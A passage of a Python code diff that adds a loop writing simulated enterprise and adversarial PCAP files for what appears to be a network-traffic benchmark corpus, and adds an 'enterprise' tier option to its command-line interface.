+    """Generate the realistic multi-session enterprise & adversarial simulated PCAPs."""
+    output_dir = Path(output_dir)
+    output_dir.mkdir(parents=True, exist_ok=True)
+    results: Dict[str, Path] = {}
+    for name, gen_fn in ENTERPRISE_GENERATORS.items():
+        print(f"  Generating {name}.pcap ...", end=" ", flush=True)
+        try:
+            path = gen_fn(output_dir)
+            results[name] = path
+            try:
+                print(f"[OK] ({path.stat().st_size:,} bytes)")
+            except UnicodeEncodeError:
+                print(f"OK ({path.stat().st_size:,} bytes)")
+        except Exception as e:
+            try:
+                print(f"[FAIL] ERROR: {e}")
+            except UnicodeEncodeError:
+                print(f"FAIL ERROR: {e}")
+            results[name] = None
+    return results
+
+
 # ---------------------------------------------------------------------------
 # CLI Entrypoint
 # ---------------------------------------------------------------------------
@@ -1598,9 +2340,9 @@ def main():
     )
     parser.add_argument(
         "--tier",
-        choices=["1", "2", "3", "tier1", "tier2", "tier3", "all"],
+        choices=["1", "2", "3", "tier1", "tier2", "tier3", "enterprise", "all"],
         default="all",
-        help="Corpus tier to generate: 1=Synthetic (5), 2=Real Lab (3), 3=Adversarial (7), all=Full (15)",
+        help="Corpus tier to generate: 1=Synthetic (5), 2=Real Lab (3), 3=Adversarial (7), enterprise=Multi-Session (3), all=Full Benchmark (15)",
     )
     parser.add_argument(
         "--out",
